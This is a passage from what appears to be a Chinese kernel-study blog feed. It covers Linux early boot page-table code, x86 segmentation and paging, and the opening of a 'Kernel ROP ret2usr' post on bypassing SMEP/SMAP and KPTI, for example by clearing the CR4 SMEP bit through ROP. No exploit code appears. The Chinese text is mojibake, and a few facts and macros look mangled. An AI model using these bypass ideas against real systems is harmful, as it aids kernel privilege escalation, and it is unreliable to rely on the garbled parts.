ç‰©ç†åœ°å€ä¸º0x1000000-0x2800000ï¼ˆå·®ä¸å¤šè¿™ä¸ªèŒƒå›´ï¼‰</span><br><span class="hljs-comment"> */</span><br><br>next_pgt_ptr = fixup_pointer(&amp;next_early_pgt, physaddr);<br>pud = fixup_pointer(early_dynamic_pgts[(*next_pgt_ptr)++], physaddr);<br>pmd = fixup_pointer(early_dynamic_pgts[(*next_pgt_ptr)++], physaddr);<br><br>pgtable_flags = _KERNPG_TABLE_NOENC + sme_get_me_mask();<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_X86_5LEVEL)) &#123;<br>p4d = fixup_pointer(early_dynamic_pgts[next_early_pgt++], physaddr);<br><br>i = (physaddr &gt;&gt; PGDIR_SHIFT) % PTRS_PER_PGD;<br>pgd[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pgdval_t</span>)p4d + pgtable_flags;<br>pgd[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pgdval_t</span>)p4d + pgtable_flags;<br><br>i = (physaddr &gt;&gt; P4D_SHIFT) % PTRS_PER_P4D;<br>p4d[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>p4d[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// pgd=fixup_pointer(&amp;early_top_pgt, physaddr);</span><br>i = (physaddr &gt;&gt; PGDIR_SHIFT) % PTRS_PER_PGD;<br>pgd[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>pgd[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>&#125;<br>    <br>i = (physaddr &gt;&gt; PUD_SHIFT) % PTRS_PER_PUD;<br>pud[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pudval_t</span>)pmd + pgtable_flags;<br>pud[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pudval_t</span>)pmd + pgtable_flags;<br><br>pmd_entry = __PAGE_KERNEL_LARGE_EXEC &amp; ~_PAGE_GLOBAL;<br>pmd_entry += sme_get_me_mask();<br>pmd_entry +=  physaddr;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; DIV_ROUND_UP(_end - _text, PMD_SIZE); i++) &#123;<br><span class="hljs-type">int</span> idx = i + (physaddr &gt;&gt; PMD_SHIFT) % PTRS_PER_PMD;<br>pmd[idx] = pmd_entry + i * PMD_SIZE;<span class="hljs-comment">// å¡«å……ç‰©ç†åœ°å€</span><br>&#125;<br><br>pmd = fixup_pointer(level2_kernel_pgt, physaddr);<span class="hljs-comment">// ä¿®æ­£level2_kernel_pgtä¸­çš„ç‰©ç†åœ°å€</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; PTRS_PER_PMD; i++) &#123;<br><span class="hljs-keyword">if</span> (pmd[i] &amp; _PAGE_PRESENT)<br>pmd[i] += load_delta;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¿®æ­£phys_base</span><br><span class="hljs-comment"> */</span><br>p = fixup_pointer(&amp;phys_base, physaddr);<br>*p += load_delta - sme_get_me_mask();<br><br><span class="hljs-comment">/* Encrypt the kernel and related (if SME is active) */</span><br>sme_encrypt_kernel(bp);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Return the SME encryption mask (if SME is active) to be used as a</span><br><span class="hljs-comment"> * modifier for the initial pgdir entry programmed into CR3.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> sme_get_me_mask();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="64ä½é¡µè¡¨"><a href="#64ä½é¡µè¡¨" class="headerlink" title="64ä½é¡µè¡¨"></a>64ä½é¡µè¡¨</h3><p>x86_64ä½¿ç”¨4çº§é¡µè¡¨ï¼š</p><ul><li>å…¨å±€é¡µç›®å½•</li><li>ä¸Šå±‚é¡µç›®å½•</li><li>ä¸­é—´é¡µç›®å½•</li><li>é¡µè¡¨é¡¹</li></ul><p>åœ°å€çš„ç¬¬1-16ä½ï¼ˆé«˜åˆ°ä½ï¼‰ç”¨äºåŒºåˆ†ç”¨æˆ·æ€å’Œå†…æ ¸æ€</p><ul><li>å…¨0ä¸ºç”¨æˆ·ç©ºé—´</li><li>å…¨1ä¸ºå†…æ ¸ç©ºé—´</li></ul><p>åˆ†é¡µçš„å…·ä½“ä½æ•°å¦‚ä¸‹ï¼š</p><ul><li>1-16ï¼šä¸ä½¿ç”¨</li><li>17-25ï¼šå…¨å±€é¡µç›®å½•ï¼ˆpgdï¼‰</li><li>26-34ï¼šä¸Šå±‚é¡µç›®å½•ï¼ˆpudï¼‰</li><li>35-43ï¼šä¸­é—´é¡µç›®å½•ï¼ˆpmdï¼‰</li><li>44-52ï¼šé¡µè¡¨é¡¹</li><li>53-64ï¼šé¡µå†…åç§»</li></ul><p>ä»¥ä¸‹æºç åªæœ‰ä¸‰çº§é¡µè¡¨ï¼Œé¡µå¤§å°ä¸º0x200000ï¼ˆPAEï¼‰</p><p>__startup_64ä¸­ä½¿ç”¨çš„é¡µè¡¨ç›¸å…³å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_TABLE_NOENC(_PAGE_PRESENT | _PAGE_RW | _PAGE_USER |\</span><br><span class="hljs-meta"> _PAGE_ACCESSED | _PAGE_DIRTY)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _KERNPG_TABLE_NOENC(_PAGE_PRESENT | _PAGE_RW |\</span><br><span class="hljs-meta"> _PAGE_ACCESSED | _PAGE_DIRTY)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMDS(START, PERM, COUNT)\</span><br><span class="hljs-meta">i = 0 ;\</span><br><span class="hljs-meta">.rept (COUNT) ;\</span><br><span class="hljs-meta">.quad(START) + (i &lt;&lt; PMD_SHIFT) + (PERM) ;\</span><br><span class="hljs-meta">i = i + 1 ;\</span><br><span class="hljs-meta">.endr</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __PAGE_KERNEL_LARGE_EXEC(__PAGE_KERNEL_EXEC | _PAGE_PSE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_IMAGE_SIZE(512 * 1024 * 1024)</span><br><br>L3_START_KERNEL = pud_index(__START_KERNEL_map)<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pud_index(x)(((x) &gt;&gt; PUD_SHIFT) &amp; (PTRS_PER_PUD-1))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGDIR_SHIFT39</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PGD512</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 3rd level page</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_SHIFT30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PUD512</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * PMD_SHIFT determines the size of the area a middle-level</span><br><span class="hljs-comment"> * page table can map</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_SHIFT21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PMD512</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/*<br> * æ¯ä¸ªé¡µè¡¨ä½¿ç”¨9ä½ï¼Œå…±æœ‰1&lt;&lt;9=512ä¸ªè¡¨é¡¹<br> */<br> <br>/*<br> * å‰511é¡¹éƒ½ä¸ä½¿ç”¨<br> * ç¬¬512é¡¹å¡«å……level3_kernel_pgtçš„ç‰©ç†åœ°å€å’Œæ ‡å¿—<br> * å†…æ ¸ç©ºé—´çš„æ˜ å°„åŸºå€æ˜¯0xffffffff80000000ï¼Œç¬¬17-25ä½éƒ½ä¸º1<br> */<br>NEXT_PGD_PAGE(early_top_pgt)<br>.fill511,8,0<br>.quadlevel3_kernel_pgt - __START_KERNEL_map + _PAGE_TABLE_NOENC<br>.fillPTI_USER_PGD_FILL,8,0<br><br>NEXT_PAGE(early_dynamic_pgts)<br>.fill512*EARLY_DYNAMIC_PAGE_TABLES,8,0<br><br>/*<br> * å‰510(L3_START_KERNEL)é¡¹ä¸ä½¿ç”¨<br> * 0xffffffff80000000çš„ç¬¬26-34ä½ä¸º0b111111110ï¼ˆå†…æ ¸ç©ºé—´ï¼‰ï¼Œå¡«å……level2_kernel_pgtçš„ç‰©ç†åœ°å€å’Œæ ‡å¿—<br> * 0xffffffffc0000000çš„ç¬¬26-34ä½ä¸º0b111111111ï¼ˆç”¨æˆ·ç©ºé—´å¯ä½¿ç”¨çš„vsyscallï¼‰ï¼Œå¡«å……level2_fixmap_pgtçš„ç‰©ç†åœ°å€å’Œæ ‡å¿—<br> */<br>NEXT_PAGE(level3_kernel_pgt)<br>.fillL3_START_KERNEL,8,0<br>.quadlevel2_kernel_pgt - __START_KERNEL_map + _KERNPG_TABLE_NOENC<br>.quadlevel2_fixmap_pgt - __START_KERNEL_map + _PAGE_TABLE_NOENC<br><br>/*<br> * å‰256é¡¹å¡«å……ç‰©ç†åœ°å€ : 0x200000,0x400000,0x800000â€¦â€¦<br> * å†…æ ¸ä½¿ç”¨2MBå¤§å°çš„é¡µï¼Œæ‰€ä»¥ç¬¬44-64ä½ç”¨äºé¡µå†…åç§»<br> * å†…æ ¸ç©ºé—´çš„åœ°å€èŒƒå›´æ˜¯0xffffffff80000000-0xffffffff9fffffffï¼Œç¬¬35-43ä½æœ€å¤§å€¼ä¸º255ï¼Œåªä½¿ç”¨å‰256é¡¹<br> */<br>NEXT_PAGE(level2_kernel_pgt)<br>PMDS(0, __PAGE_KERNEL_LARGE_EXEC,<br>KERNEL_IMAGE_SIZE/PMD_SIZE)<br><br>/*<br> * å‰506é¡¹ä¸ä½¿ç”¨<br> * vsyscallsåœ°å€ä¸º0xffffffffff600000-0xffffffffff600fffï¼Œç¬¬35-43ä½ä¸º507ï¼Œåªä½¿ç”¨ç¬¬507é¡¹ï¼Œå¡«å……level1_fixmap_pgt<br> */<br>NEXT_PAGE(level2_fixmap_pgt)<br>.fill506,8,0<br>.quadlevel1_fixmap_pgt - __START_KERNEL_map + _PAGE_TABLE_NOENC<br>/* 8MB reserved for vsyscalls + a 2MB hole = 4 + 1 entries */<br>.fill5,8,0<br><br>/*<br> * å…ˆéƒ½å¡«å……0ï¼Œä¸åˆ†é…ç‰©ç†é¡µ<br> * ç”¨æˆ·ç©ºé—´ä½¿ç”¨4KBå¤§å°çš„é¡µï¼Œæ‰€ä»¥ç¬¬44-52ä½ç”¨äºé¡µè¡¨é¡¹<br> */<br>NEXT_PAGE(level1_fixmap_pgt)<br>.fill512,8,0<br><br>/*<br> * ç‰©ç†åœ°å€åŸºå€ï¼Œå…ˆå¡«å……0<br> */<br>ENTRY(phys_base)<br>/* This must match the first entry in level2_kernel_pgt */<br>.quad   0x0000000000000000<br>EXPORT_SYMBOL(phys_base)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LINUXå†…å­˜ç®¡ç†-å†…æ ¸å¯»å€</title>
    <link href="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/"/>
    <url>/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>ç†è®º(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»*)</p><p>ä¸»è¦å‚è€ƒä¹¦ç›®ï¼šã€Šæ·±å…¥ç†è§£LINUXå†…æ ¸ï¼ˆç¬¬ä¸‰ç‰ˆï¼‰ã€‹</p><p>psï¼šç†è®ºç›¸å…³è¯´æ˜ä»¥32ä½ä¸ºä¾‹</p><span id="more"></span><h1 id="å†…æ ¸å¯»å€"><a href="#å†…æ ¸å¯»å€" class="headerlink" title="å†…æ ¸å¯»å€"></a>å†…æ ¸å¯»å€</h1><p>å†…å­˜å¯»å€è¿‡ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">é€»è¾‘åœ°å€-&gt;[åˆ†æ®µå•å…ƒ]-&gt;çº¿æ€§åœ°å€-&gt;[åˆ†é¡µå•å…ƒ]-&gt;é€»è¾‘åœ°å€<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ®µ"><a href="#åˆ†æ®µ" class="headerlink" title="åˆ†æ®µ"></a>åˆ†æ®µ</h2><p>å…ˆæ”¾ä¸€å¼ å›¾è¯´æ˜åˆ†æ®µå•å…ƒå°†é€»è¾‘åœ°å€ï¼ˆ16ä½æ®µé€‰æ‹©ç¬¦ï¼š32ä½åç§»ï¼‰è½¬åŒ–ä¸ºçº¿æ€§åœ°å€çš„è¿‡ç¨‹</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E6%AE%B5.png" class title="æ®µ"><p>æ®µé€‰æ‹©ç¬¦ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">15</span>            <span class="hljs-number">3</span>  <span class="hljs-number">2</span>  <span class="hljs-number">0</span><br>+-------------+--+----+<br>|    index    |TI|RPL |<br>+-------------+--+----+<br></code></pre></td></tr></table></figure><ul><li>indexï¼šGDTæˆ–LDTä¸­æ®µæè¿°ç¬¦çš„å…¥å£</li><li>TIï¼š1è¡¨ç¤ºæ®µæè¿°ç¬¦åœ¨LDTä¸­ï¼Œ0è¡¨ç¤ºæ®µæè¿°ç¬¦åœ¨GDTä¸­</li><li>RPLï¼šè¯·æ±‚è€…ç‰¹æƒçº§ï¼Œ0ï¼ˆå†…æ ¸æ€ï¼‰æˆ–3ï¼ˆç”¨æˆ·æ€ï¼‰</li></ul><p>æ®µæè¿°ç¬¦ç»“æ„ï¼š</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" class title="æ®µæè¿°ç¬¦"><ul><li>Baseï¼šæ®µé¦–å­—èŠ‚çš„çº¿æ€§åœ°å€</li><li>Gï¼šç²’åº¦æ ‡è®°ï¼Œ0åˆ™æ®µå¤§å°ä¸€å­—èŠ‚ä¸ºå•ä½ï¼Œ1åˆ™ä»¥4086å­—èŠ‚ä¸ºå•ä½</li><li>Limitï¼šæ®µä¸­æœ€åä¸€ä¸ªå†…å­˜å•å…ƒçš„åç§»é‡</li><li>Sï¼šç³»ç»Ÿæ ‡å¿—ï¼Œ0è¡¨ç¤ºç³»ç»Ÿæ®µï¼ˆå¦‚LDTï¼‰</li><li>Typeï¼šæ®µç±»å‹å’Œå­˜å–æƒé™ï¼ˆä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œä»»åŠ¡çŠ¶æ€æ®µï¼‰</li><li>DPLï¼šç‰¹æƒçº§</li><li>Pï¼š0è¡¨ç¤ºä¸åœ¨ä¸»å­˜ä¸­ï¼ˆLinuxæ€»æ˜¯å°†Pç½®1ï¼Œå› ä¸ºä¸æŠŠæ•´ä¸ªæ®µæ¢åˆ°ç£ç›˜ä¸­ï¼‰</li><li>Dæˆ–Bï¼šæ•°æ®æ®µæˆ–ä»£ç æ®µ</li><li>AVLï¼šç•¥</li></ul><h3 id="Linuxä¸­çš„åˆ†æ®µ"><a href="#Linuxä¸­çš„åˆ†æ®µ" class="headerlink" title="Linuxä¸­çš„åˆ†æ®µ"></a>Linuxä¸­çš„åˆ†æ®µ</h3><p>80x86ç»“æ„ä½¿ç”¨ä»¥ä¸‹åˆ†æ®µï¼š</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/linux%E5%88%86%E6%AE%B5.png" class title="linuxåˆ†æ®µ"><p>ç›¸åº”çš„æ®µé€‰æ‹©ç¬¦ç”±__USER_CSã€__KERNEL_CSã€__USER_DSã€__KERNEL_DSå®šä¹‰ï¼Œå¯»å€æ—¶åªéœ€è¦æŠŠç›¸åº”çš„å®è£…å…¥csæ®µå¯„å­˜å™¨æˆ–è€…dsæ®µå¯„å­˜å™¨å°±è¡Œ</p><p>æ‰€æœ‰æ®µéƒ½ä»0å¼€å§‹ï¼Œè¯´æ˜Linuxä¸­é€»è¾‘åœ°å€å’Œçº¿æ€§åœ°å€æ˜¯ä¸€æ ·çš„</p><p>å®é™…å¯»å€æ—¶åªéœ€è¦ä½¿ç”¨csæˆ–è€…dså¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©ç¬¦+åœ°å€åç§»å°±å¯ä»¥è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬æ—¥å¸¸çœ‹åˆ°çš„åœ°å€å®é™…ä¸Šéƒ½æ˜¯é€»è¾‘åœ°å€ä¸­çš„åç§»</p><h2 id="åˆ†é¡µ"><a href="#åˆ†é¡µ" class="headerlink" title="åˆ†é¡µ"></a>åˆ†é¡µ</h2><p>cr0å¯„å­˜å™¨ä¸­çš„PGæ ‡å¿—è¡¨ç¤ºåˆ†é¡µæ˜¯å¦å¼€å¯ï¼ŒPG&#x3D;0æ—¶çº¿æ€§åœ°å€ç›´æ¥è¢«è§£é‡Šä¸ºç‰©ç†åœ°å€</p><h3 id="ä¸€äº›åˆ†é¡µæœºåˆ¶"><a href="#ä¸€äº›åˆ†é¡µæœºåˆ¶" class="headerlink" title="ä¸€äº›åˆ†é¡µæœºåˆ¶"></a>ä¸€äº›åˆ†é¡µæœºåˆ¶</h3><h4 id="å¸¸è§„åˆ†é¡µ"><a href="#å¸¸è§„åˆ†é¡µ" class="headerlink" title="å¸¸è§„åˆ†é¡µ"></a>å¸¸è§„åˆ†é¡µ</h4><p>åˆ†é¡µå•å…ƒå°†çº¿æ€§åœ°å€è½¬åŒ–ä¸ºç‰©ç†åœ°å€çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E5%88%86%E9%A1%B5.png" class title="åˆ†é¡µ"><p>10+10+12&#x3D;32</p><p>é¡µç›®å½•é¡¹å’Œé¡µè¡¨é¡¹ç»“æ„ï¼š</p><ul><li>Presentï¼šé¡µæ˜¯å¦åœ¨ä¸»å­˜ä¸­</li><li>Fieldï¼šé¡µæ¡†ç‰©ç†åœ°å€é«˜20ä½ï¼ˆä¸€é¡µ4KBï¼Œé¡µæ¡†åŸºåœ°å€0x1000å¯¹é½ï¼‰</li><li>Accessedï¼šåˆ†é¡µå•å…ƒå¯»å€æ—¶ä½¿ç”¨ï¼Œå½“é¡µè¢«äº¤æ¢å‡ºå»æ—¶è¢«æ“ä½œç³»ç»Ÿä½¿ç”¨</li><li>Dirtyï¼šé¡µè¢«ä¿®æ”¹</li><li>Read&#x2F;Writeï¼šå­˜å–æƒé™</li><li>User&#x2F;Supervisorï¼šç‰¹æƒçº§</li><li>PCDå’ŒPWTæ ‡å¿—ï¼šæ§åˆ¶ç¡¬ä»¶é«˜é€Ÿç¼“å­˜å¤„ç†é¡µæˆ–é¡µè¡¨çš„æ–¹å¼</li><li>Page Sizeï¼šåº”ç”¨äºé¡µç›®å½•é¡¹ï¼Œç½®1è¡¨ç¤ºé¡µç›®å½•æŒ‡å‘2MBæˆ–4MBçš„é¡µæ¡†</li><li>Globalï¼šåº”ç”¨äºé¡µè¡¨é¡¹ï¼Œé˜²æ­¢å¸¸ç”¨é¡µè¢«ä»TLBä¸­åˆ·æ–°å‡ºå»ï¼Œcr4çš„PGEæ ‡å¿—ç½®1æ—¶ä½¿ç”¨</li></ul><h4 id="æ‰©å±•åˆ†é¡µ"><a href="#æ‰©å±•åˆ†é¡µ" class="headerlink" title="æ‰©å±•åˆ†é¡µ"></a>æ‰©å±•åˆ†é¡µ</h4><p>é¡µæ¡†å¤§å°ä¸º4MBè€Œä¸æ˜¯4KB</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/%E6%89%A9%E5%B1%95%E5%88%86%E9%A1%B5.png" class title="æ‰©å±•åˆ†é¡µ"><p>10+22&#x3D;32</p><p>ç›®å½•é¡¹å’Œæ­£å¸¸åˆ†é¡µåŸºæœ¬ç›¸åŒï¼Œé™¤äº†ï¼š</p><ul><li>Page Sizeå¿…é¡»è®¾ç½®</li><li>32ä½ç‰©ç†åœ°å€ï¼ˆoffsetï¼‰åªæœ‰æœ€é«˜10ä½æœ‰æ„ä¹‰ï¼Œå› ä¸º4MBçš„é¡µå¤§å°0x400000å¯¹é½</li></ul><p>è®¾ç½®cr4å¯„å­˜å™¨çš„PSEæ ‡å¿—èƒ½ä½¿æ‰©å±•åˆ†é¡µå’Œå¸¸è§„åˆ†é¡µå…±å­˜</p><h4 id="ç‰©ç†åœ°å€æ‰©å±•ï¼ˆPAEï¼‰åˆ†é¡µæœºåˆ¶"><a href="#ç‰©ç†åœ°å€æ‰©å±•ï¼ˆPAEï¼‰åˆ†é¡µæœºåˆ¶" class="headerlink" title="ç‰©ç†åœ°å€æ‰©å±•ï¼ˆPAEï¼‰åˆ†é¡µæœºåˆ¶"></a>ç‰©ç†åœ°å€æ‰©å±•ï¼ˆPAEï¼‰åˆ†é¡µæœºåˆ¶</h4><p>32ä½çº¿æ€§åœ°å€å¯ä»¥ä½¿ç”¨4GBçš„ç‰©ç†åœ°å€ï¼Œä¸ºäº†ä½¿ç”¨å¢åŠ çš„ç‰©ç†åœ°å€ï¼ˆ64GBï¼‰äº§ç”Ÿäº†PAE</p><p>è®¾ç½®cr4çš„PAEæ ‡å¿—æ¿€æ´»PAEï¼Œé¡µç›®å½•é¡¹ä¸­çš„Page Sizeæ ‡å¿—å¯ç”¨å¤§å°ºå¯¸é¡µï¼ˆå¯ç”¨PAEæ—¶ä¸º2MBï¼‰</p><ul><li>å¼•å…¥PDPTï¼Œæ”¹å˜cr3ä¸­çš„å€¼</li><li>åŒä¸€çº¿æ€§åœ°å€å¯èƒ½å¯¹åº”ä¸åŒç‰©ç†åœ°å€</li></ul><h3 id="Linuxä¸­çš„åˆ†é¡µ"><a href="#Linuxä¸­çš„åˆ†é¡µ" class="headerlink" title="Linuxä¸­çš„åˆ†é¡µ"></a>Linuxä¸­çš„åˆ†é¡µ</h3><p>32ä½64ä½é€šç”¨</p><img src="/2023/08/05/LINUX%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-%E5%86%85%E6%A0%B8%E5%AF%BB%E5%9D%80/linux%E5%88%86%E9%A1%B5.png" class title="linuxåˆ†é¡µ"><ul><li>32ä½ï¼šé¡µä¸Šçº§ç›®å½•å’Œé¡µä¸­é—´ç›®å½•å…¨ä¸º0</li><li>å¯ç”¨PAEçš„32ä½ï¼šä¸‰çº§é¡µè¡¨ï¼Œé¡µå…¨å±€ç›®å½•å¯¹åº”PDPTï¼Œå–æ¶ˆé¡µä¸Šçº§ç›®å½•</li></ul><h3 id="ä¸€äº›åŠ å¿«åˆ†é¡µçš„ç¡¬ä»¶"><a href="#ä¸€äº›åŠ å¿«åˆ†é¡µçš„ç¡¬ä»¶" class="headerlink" title="ä¸€äº›åŠ å¿«åˆ†é¡µçš„ç¡¬ä»¶"></a>ä¸€äº›åŠ å¿«åˆ†é¡µçš„ç¡¬ä»¶</h3><ul><li>ç¡¬ä»¶é«˜é€Ÿç¼“å­˜</li><li>è½¬æ¢åæ´ç¼“å†²å™¨ï¼ˆTLBï¼‰</li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel ROP ret2usr</title>
    <link href="/2023/08/04/kernel-rop-ret2usr/"/>
    <url>/2023/08/04/kernel-rop-ret2usr/</url>
    
    <content type="html"><![CDATA[<p>é’ˆå¯¹SMAP&#x2F;SMEPç»•è¿‡çš„ret2usr</p><span id="more"></span><h1 id="ret2usrç›¸å…³ä¿æŠ¤å’Œç»•è¿‡"><a href="#ret2usrç›¸å…³ä¿æŠ¤å’Œç»•è¿‡" class="headerlink" title="ret2usrç›¸å…³ä¿æŠ¤å’Œç»•è¿‡"></a>ret2usrç›¸å…³ä¿æŠ¤å’Œç»•è¿‡</h1><h2 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h2><ul><li>SMAPï¼šç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤</li><li>SMEPï¼šç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤</li></ul><p>é˜»æ­¢å†…æ ¸ç©ºé—´ç›´æ¥è®¿é—®&#x2F;æ‰§è¡Œç”¨æˆ·ç©ºé—´æ•°æ®&#x2F;ä»£ç </p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li><p>ret2dirï¼ˆè¯¦æƒ…è§ret2dirï¼‰</p></li><li><p>Intelä¸‹ç³»ç»Ÿæ ¹æ®CR4æ§åˆ¶å¯„å­˜å™¨çš„ç¬¬20ä½æ ‡è¯†æ˜¯å¦å¼€å¯SMEPä¿æŠ¤ï¼ˆ1ä¸ºå¼€å¯ï¼Œ0ä¸ºå…³é—­ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨ROPæ›´æ”¹CR4å¯„å­˜å™¨çš„å€¼ï¼ˆæ”¾ä¸€å¼ å…¸ä¸­å…¸çš„å›¾ï¼‰</p><img src="/2023/08/04/kernel-rop-ret2usr/dzd1.png" class title="dzd1"></li></ul><h2 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h2><ul><li><p>å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ä½¿ç”¨ä¸åŒçš„é¡µè¡¨é›†</p></li><li><p>ä¸¤å¼ é¡µè¡¨ä¸­éƒ½æœ‰å¯¹ç”¨æˆ·ç©ºé—´å†…å­˜çš„å®Œæ•´æ˜ å°„ï¼Œä½†ç”¨æˆ·ç©ºé—´é¡µè¡¨åªæœ‰éƒ¨åˆ†å†…æ ¸ç©ºé—´å†…å­˜çš„æ˜ å°„ï¼ˆå†æ”¾ä¸€å¼ å…¸ä¸­å…¸çš„å›¾ï¼‰</p><img src="/2023/08/04/kernel-rop-ret2usr/dzd2.png" class 